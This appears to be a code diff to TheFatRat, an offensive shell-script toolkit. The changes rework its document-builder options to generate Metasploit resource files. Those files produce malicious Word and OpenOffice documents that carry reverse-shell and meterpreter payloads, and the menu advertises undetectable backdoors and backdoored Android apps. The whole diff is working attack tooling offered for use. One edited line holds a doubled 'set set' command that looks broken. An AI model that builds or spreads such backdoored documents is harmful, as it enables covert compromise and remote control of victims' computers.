@@ -123,7 +123,7 @@ apkconfig=$path/config/apk.tmp
 unzip=unzip
 temp=$path/temp
 file="config/config.path"
-
+meterp="$path/temp/meterpreter.rc"
 #Checking
 [[ `id -u` -eq 0 ]] || { echo -e $red "Must be root to run script"; exit 1; } 
 resize -s 33 84 > /dev/null
@@ -966,7 +966,17 @@ case $choice in
 					gboor
 					spinlong
 					echo ""
-         				xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -x 'use exploit/windows/fileformat/ms12_027_mscomctl_bof; set payload $payloads ; set FILENAME $fira.doc; set lhost $yourip ; set lport $yourport; exploit; exit -y'"
+                                        rm -rf $path/temp/* >/dev/null 2>&1
+                                        touch $meterp
+                                        echo "use exploit/windows/fileformat/ms12_027_mscomctl_bof" >$meterp
+                                        echo "set PAYLOAD $payloads" >> $meterp 
+                                        echo "set LHOST $yourip" >> $meterp 
+                                        echo "set LPORT $yourport" >> $meterp 
+                                        echo "set FILENAME $fira.doc" >> $meterp 
+                                        echo "exploit" >> $meterp 
+                                        echo "exit -y" >> $meterp 
+         				xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp"
+                                        rm -rf $meterp >/dev/null 2>&1
          				echo ""
          				mv ~/.msf4/local/$fira.doc $path/output/$fira.doc 
          				echo -e $okegreen""
@@ -1013,7 +1023,18 @@ case $choice in
 					gboor
 					spinlong
 					echo ""
-         				xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -x 'use exploit/multi/fileformat/office_word_macro; set payload $payloads ; set FILENAME $fira.docm; set BODY $bodys; set lhost $yourip ; set lport $yourport; exploit; exit -y'"
+                                        rm -rf $path/temp/* >/dev/null 2>&1
+                                        touch $meterp
+                                        echo "use exploit/multi/fileformat/office_word_macro" >$meterp
+                                        echo "set PAYLOAD $payloads" >> $meterp 
+                                        echo "set LHOST $yourip" >> $meterp 
+                                        echo "set LPORT $yourport" >> $meterp 
+                                        echo "set FILENAME $fira.docm" >> $meterp
+                                        echo "set BODY $bodys" >> $meterp
+                                        echo "exploit" >> $meterp 
+                                        echo "exit -y" >> $meterp 
+                                        xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp"
+                                        rm -rf $meterp >/dev/null 2>&1
          				echo ""
          				mv ~/.msf4/local/$fira.docm $path/output/$fira.docm 
          				echo -e $okegreen""
@@ -1027,8 +1048,7 @@ case $choice in
 							then
 					#payload y
 					echo ""
-					echo -ne $okegreen "  Located file (example:/output/backdoor.exe) :" ;tput sgr0
-					read path
+                                        exef=$(zenity --file-selection --file-filter='EXE files (exe) | *.exe' --title="Select your backdoor executable file");
 					echo ""
 					payloads=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" --width 350 --height 265) > /dev/null 2>&1
 					spinlong
@@ -1037,7 +1057,19 @@ case $choice in
 					gboor
 					spinlong
 					echo ""
-         				xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -x 'use exploit/multi/fileformat/office_word_macro; set payload $payloads ; set FILENAME $fira.docm; set BODY $bodys; set lhost $yourip ; set lport $yourport; set EXE::Custom $path; exploit; exit -y'"
+                                        rm -rf $path/temp/* >/dev/null 2>&1
+                                        touch $meterp
+                                        echo "use exploit/multi/fileformat/office_word_macro" >$meterp
+                                        echo "set PAYLOAD $payloads" >> $meterp 
+                                        echo "set LHOST $yourip" >> $meterp 
+                                        echo "set LPORT $yourport" >> $meterp 
+                                        echo "set FILENAME $fira.docm" >> $meterp
+                                        echo "set BODY $bodys" >> $meterp
+                                        echo "set EXE::Custom $exef" >> $meterp
+                                        echo "exploit" >> $meterp 
+                                        echo "exit -y" >> $meterp 
+         				xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp"
+                                        rm -rf $meterp >/dev/null 2>&1
          				echo ""
          				mv ~/.msf4/local/$fira.docm $path/output/$fira.docm 
 					echo ""
@@ -1086,7 +1118,19 @@ fi
 					gboor
 					spinlong
 					echo ""
-         				xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -x 'use exploit/multi/fileformat/office_word_macro; set payload $payloads ; set FILENAME $fira.docm; set BODY $bodys; set lhost $yourip ; set lport $yourport; set target 1; exploit; exit -y'"
+                                        rm -rf $path/temp/* >/dev/null 2>&1
+                                        touch $meterp
+                                        echo "use exploit/multi/fileformat/office_word_macro" >$meterp
+                                        echo "set PAYLOAD $payloads" >> $meterp 
+                                        echo "set LHOST $yourip" >> $meterp 
+                                        echo "set LPORT $yourport" >> $meterp 
+                                        echo "set FILENAME $fira.docm" >> $meterp
+                                        echo "set BODY $bodys" >> $meterp
+                                        echo "set target 1" >> $meterp
+                                        echo "exploit" >> $meterp 
+                                        echo "exit -y" >> $meterp 
+         				xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp"
+                                        rm -rf $meterp >/dev/null 2>&1
          				echo ""
          				mv ~/.msf4/local/$fira.docm $path/output/$fira.docm 
          				echo -e $okegreen""
@@ -1099,8 +1143,7 @@ fi
 							then
 					#payload y
 					echo ""
-					echo -ne $okegreen "  Located file (example:/output/backdoor.exe) :" ;tput sgr0
-					read path
+					exef=$(zenity --file-selection --file-filter='EXE files (exe) | *.exe' --title="Select your backdoor executable file");
 					fi
 					echo ""
 					payloads=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "python/meterpreter/reverse_tcp" FALSE "generic/shell_reverse_tcp" --width 350 --height 265) > /dev/null 2>&1
@@ -1110,7 +1153,20 @@ fi
 					gboor
 					spinlong
 					echo ""
-         				xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -x 'use exploit/multi/fileformat/office_word_macro; set payload $payloads ; set FILENAME $fira.docm; set BODY $bodys; set lhost $yourip ; set lport $yourport; set EXE::Custom $path; set target 1; exploit; exit -y'"
+                                        rm -rf $path/temp/* >/dev/null 2>&1
+                                        touch $meterp
+                                        echo "use exploit/multi/fileformat/office_word_macro" >$meterp
+                                        echo "set PAYLOAD $payloads" >> $meterp 
+                                        echo "set LHOST $yourip" >> $meterp 
+                                        echo "set LPORT $yourport" >> $meterp 
+                                        echo "set FILENAME $fira.docm" >> $meterp
+                                        echo "set BODY $bodys" >> $meterp
+                                        echo "set set EXE::Custom $exef" >> $meterp
+                                        echo "set target 1" >> $meterp
+                                        echo "exploit" >> $meterp 
+                                        echo "exit -y" >> $meterp 
+         				xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp"
+                                        rm -rf $meterp >/dev/null 2>&1
          				echo ""
          				mv ~/.msf4/local/$fira.docm $path/output/$fira.docm 
          				echo -e $okegreen""
@@ -1122,7 +1178,7 @@ fi
 ;;
 
 4)
-echo -e $red"   Apache OpenOffice on Windows (PSH) "
+                                        echo -e $red"   Apache OpenOffice on Windows (PSH) "
 					echo -e $okegreen""
 					echo -ne "   SET LHOST : ";tput sgr0
 					read yourip
@@ -1150,7 +1206,18 @@ echo -e $red"   Apache OpenOffice on Windows (PSH) "
 					gboor
 					spinlong
 					echo ""
-         				xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -x 'use exploit/multi/misc/openoffice_document_macro; set payload $payloads ; set FILENAME $fira.odt; set BODY $bodys; set lhost $yourip ; set lport $yourport; exploit; exit -y'"
+                                        rm -rf $path/temp/* >/dev/null 2>&1
+                                        touch $meterp
+                                        echo "use exploit/multi/misc/openoffice_document_macro" >$meterp
+                                        echo "set PAYLOAD $payloads" >> $meterp 
+                                        echo "set LHOST $yourip" >> $meterp 
+                                        echo "set LPORT $yourport" >> $meterp 
+                                        echo "set FILENAME $fira.odt" >> $meterp
+                                        echo "set BODY $bodys" >> $meterp
+                                        echo "exploit -z" >> $meterp 
+                                        echo "exit -y" >> $meterp 
+                                        xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp"
+                                        rm -rf $meterp >/dev/null 2>&1
          				echo ""
          				mv ~/.msf4/local/$fira.odt $path/output/$fira.odt
          				echo -e $okegreen""
@@ -1190,11 +1257,22 @@ echo -e $red"   Apache OpenOffice on Windows (PSH) "
 					gboor
 					spinlong
 					echo ""
-         				xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -x 'use exploit/multi/misc/openoffice_document_macro; set payload $payloads ; set FILENAME $fira.odt; set BODY $bodys; set lhost $yourip ; set lport $yourport; exploit; exit -y'"
+                                        rm -rf $path/temp/* >/dev/null 2>&1
+                                        touch $meterp
+                                        echo "use exploit/multi/misc/openoffice_document_macro" >$meterp
+                                        echo "set PAYLOAD $payloads" >> $meterp 
+                                        echo "set LHOST $yourip" >> $meterp 
+                                        echo "set LPORT $yourport" >> $meterp 
+                                        echo "set FILENAME $fira.odt" >> $meterp
+                                        echo "set BODY $bodys" >> $meterp
+                                        echo "exploit" >> $meterp 
+                                        echo "exit -y" >> $meterp 
+         				xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp"
+                                        rm -rf $meterp >/dev/null 2>&1
          				echo ""
          				mv ~/.msf4/local/$fira.odt $path/output/$fira.odt
          				echo -e $okegreen""
-         				eecho -e $yellow"  Backdoor doc Saved To : $path/output/$fira.odt "
+         				echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.odt "
 					sleep 2	
 					echo ""
                                         read -rsp $'Press any key to return to menu\n' -n 1 key
@@ -2290,7 +2368,7 @@ menu () {
   		echo -e $white"	[$okegreen"04"$white]$okegreen  Create Fud Backdoor with backdoor-factory [embed] "
   		echo -e $white"	[$okegreen"05"$white]$okegreen  Backdooring Original apk [Instagram, Line,etc] "
   		echo -e $white"	[$okegreen"06"$white]$okegreen  Create Fud Backdoor 1000% with PwnWinds [Excelent] "
-                echo -e $white"	[$okegreen"07"$white]$okegreen  Create Office Exploit with Microsploit "
+                echo -e $white"	[$okegreen"07"$white]$okegreen  Create Backdoor For Office with Microsploit "
   		echo -e $white"	[$okegreen"08"$white]$okegreen  Create auto listeners  "
   		echo -e $white"	[$okegreen"09"$white]$okegreen  Jump to msfconsole  "
   		echo -e $white"	[$okegreen"10"$white]$okegreen  Searchsploit  "
@@ -2500,7 +2578,7 @@ echo
 		echo -e $white"	[$okegreen"04"$white]$okegreen  Create Fud Backdoor with backdoor-factory [embed] "
 		echo -e $white"	[$okegreen"05"$white]$okegreen  Backdooring Original apk [Instagram, Line,etc] "
 		echo -e $white"	[$okegreen"06"$white]$okegreen  Create Fud Backdoor 1000% with PwnWinds [Excelent] "
-                echo -e $white"	[$okegreen"07"$white]$okegreen  Create Office Exploit with Microsploit "
+                echo -e $white"	[$okegreen"07"$white]$okegreen  Create Backdoor For Office with Microsploit "
 		echo -e $white"	[$okegreen"08"$white]$okegreen  Create auto listeners  "
 		echo -e $white"	[$okegreen"09"$white]$okegreen  Jump to msfconsole  "
 		echo -e $white"	[$okegreen"10"$white]$okegreen  Searchsploit  "
